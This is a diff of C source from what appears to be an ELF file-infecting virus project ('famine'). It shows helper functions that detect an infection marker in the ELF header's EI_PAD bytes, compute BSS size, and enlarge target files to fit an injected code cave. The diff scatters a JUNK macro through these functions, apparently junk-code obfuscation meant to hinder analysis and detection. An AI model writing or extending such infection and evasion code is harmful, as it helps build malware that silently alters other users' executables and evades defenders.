@@ -9,11 +9,14 @@
 #include "famine.h"
 #include "utils.h"
 #include "map.h"
+#include "death.h"
 #include "syscall.h"
 
 int	check_elf_magic(int fd) {
 	Elf64_Ehdr ehdr;
 	uint32_t magic;
+
+	JUNK;
 
 	if (pread(fd, &ehdr, sizeof(Elf64_Ehdr), 0) != sizeof(Elf64_Ehdr) ||
 		ehdr.e_ident[EI_MAG0] != ELFMAG0 ||
@@ -23,10 +26,15 @@ int	check_elf_magic(int fd) {
 		return -1;
 	}
 
+	JUNK;
+
 	/* check if it's a 64-bit elf */
 	if (ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
 		return -1;
 	}
+
+	JUNK;
+
 
 	/* check EI_PAD to see if its infected */
 	magic = *(uint32_t *)&ehdr.e_ident[EI_PAD];
@@ -44,6 +52,9 @@ int get_bss_size(int fd, uint64_t* bss_len) {
 
 	if (pread(fd, &ehdr, sizeof(Elf64_Ehdr), 0) != sizeof(Elf64_Ehdr)) {
 		return 1;
+
+		JUNK;
+
 	}
 
 	for (size_t i = ehdr.e_phnum; i--;) {
@@ -57,6 +68,9 @@ int get_bss_size(int fd, uint64_t* bss_len) {
 			break;
 		}
 	}
+
+	JUNK;
+
 
 	return 0;
 }
@@ -72,6 +86,8 @@ int map_file(const char *filename, t_data *data) {
 	if (fd == -1) {
 		return -1;
 	}
+
+	JUNK;
 
 	if (fstat(fd, &st) == -1) {
 		close(fd);
@@ -89,6 +105,8 @@ int map_file(const char *filename, t_data *data) {
 		return -1;
 	}
 
+	JUNK;
+
 	const size_t size = st.st_size + data->cave.p_size + bss_len;
 
 	if (ftruncate(fd, size) == -1) {
@@ -101,6 +119,8 @@ int map_file(const char *filename, t_data *data) {
 		close(fd);
 		return -1;
 	}
+
+	JUNK;
 
 	close(fd);
 
